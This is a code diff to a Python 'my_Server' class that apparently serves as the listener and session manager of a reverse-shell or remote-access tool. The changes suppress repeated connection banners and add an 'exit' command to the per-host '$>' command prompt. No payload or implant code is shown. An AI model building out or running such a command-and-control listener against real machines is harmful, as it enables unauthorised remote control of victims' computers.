@@ -13,6 +13,7 @@ class my_Server():
         self.system = platform.system()
         self.sessions = dict()
         self.done = False
+        self.done1 = False
     def listen(self):
         try:
             self.i.bind((self.lhost , self.lport))
@@ -29,9 +30,12 @@ class my_Server():
             if 'GET' in hostname or 'POST' in hostname:
                 pass
             else:
-                print(f'[+] Get New Connection From ==> {hostname}:{addr[1]}')
+                if self.done1 == False:
+                    print(f'[+] Get New Connection From ==> {hostname}:{addr[0]}')
+                    self.done = True
+                else:
+                    pass
                 self.sessions[hostname] = conn
-                self.done = True
         except Exception as e:
             print(f'Error => {e}')
     def session_manager(self):
@@ -72,6 +76,7 @@ class my_Server():
     def interact_user(self ,conn , hostname):
         try:
             while True:
+                self.done1 = True
                 command = input(f'{hostname} $>')
                 if command == 'help':
                     pass
@@ -170,6 +175,8 @@ class my_Server():
                                 print('Permission Error !')
                     except UnicodeError:
                         print('Make sure to place the file in the same folder as the server.')
+                elif command == 'exit':
+                    break
                 else:
                     print('Command Not Found ?!')
         except Exception as e :
